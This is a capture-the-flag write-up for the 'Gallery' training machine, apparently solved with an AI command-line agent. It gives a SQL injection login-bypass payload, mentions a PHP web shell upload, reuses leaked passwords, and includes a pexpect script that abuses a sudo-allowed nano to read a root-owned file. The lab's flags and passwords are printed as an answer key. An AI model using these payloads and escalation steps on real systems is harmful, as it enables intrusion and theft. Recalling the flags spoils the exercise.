### Gallery CTF Writeup
(*solved using gemini-cli*)

## Target Information
- **Target IP:** 10.49.176.80 (Previously 10.49.130.32)
- **Difficulty:** Medium
- **Goal:** Obtain admin password hash, user flag, and root flag.

---

## 1. Enumeration

### Port Scanning
An initial Nmap scan revealed the following open ports:
- **Port 22:** SSH (OpenSSH 8.2p1)
- **Port 80:** HTTP (Apache 2.4.41) - Default Ubuntu page.
- **Port 8080:** HTTP (Apache 2.4.41) - Simple Image Gallery System.

### Web Application Analysis
The service on port 8080 was identified as "Simple Image Gallery System v1.0". 
- Accessing `/gallery/admin/login.php` confirmed the existence of an administration panel.
- The application was found to be vulnerable to SQL Injection in the login form.

---

## 2. Exploitation (Initial Access)

### SQL Injection
The login form was bypassed using a classic SQL injection payload:
- **Username:** `admin' OR 1=1 -- -`
- **Password:** (Anything)

This provided access to the admin dashboard. From here, I navigated to the database settings to retrieve user credentials.

### Database Extraction
Using a PHP shell uploaded through the "System Settings" avatar upload or by querying the database directly:
- **Admin Hash:** `a228b12a08b6527e7978cbe5d914531c` (MD5)
- **Cracked Password:** `p@ssword` (using John the Ripper with `rockyou.txt`)

---

## 3. Pivot to User (Mike)

### Credential Discovery
While exploring the filesystem via the PHP shell, I found a backup directory: `/var/backups/mike_home_backup/`.
Checking the `.bash_history` file in the backup revealed Mike's password:
- **User:** `mike`
- **Password:** `b3stpassw0rdbr0xx`

### SSH Access & User Flag
I used these credentials to log in via SSH:
```bash
ssh mike@10.49.176.80
```
- **User Flag:** `THM{af05cd30bfed67849befd546ef}`

---

## 4. Privilege Escalation (Root)

### Sudo Permissions
Checking sudo permissions for Mike:
```bash
User mike may run the following commands on ip-10-49-176-80:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

### The /opt/rootkit.sh Script
The script allows the user to perform several actions, including "read", which opens `/root/report.txt` in `nano` as root:
```bash
read)
    /bin/nano /root/report.txt;;
```

### Nano Exploit (GTFOBins)
`nano` can be used to execute arbitrary commands if run as root. The sequence is:
1. Run `sudo /bin/bash /opt/rootkit.sh` and select `read`.
2. Inside `nano`, press `^R` (Read File) followed by `^X` (Execute Command).
3. Type the command to execute (e.g., `chmod +s /bin/bash` or `cat /root/root.txt > /tmp/flag.txt`).

### Automation with Pexpect
Due to the interactive nature of `nano`, I used a Python script with the `pexpect` library to automate the keystrokes:
```python
import pexpect
child = pexpect.spawn('sudo /bin/bash /opt/rootkit.sh', env={'TERM': 'xterm'}, encoding='utf-8')
child.expect('... report ?')
child.sendline('read')
child.send('\x12') # Ctrl+R
child.expect('File to insert')
child.send('/root/root.txt\r') # Read flag into buffer
child.send('\x0f') # Ctrl+O (Save)
child.send('/tmp/flag.txt\r') # Save buffer to world-readable path
child.send('Y') # Confirm overwrite
child.send('\x18') # Exit
```

- **Root Flag:** `THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}`

---

## Summary of Flags
- **Admin Hash:** `a228b12a08b6527e7978cbe5d914531c`
- **User Flag:** `THM{af05cd30bfed67849befd546ef}`
- **Root Flag:** `THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}`
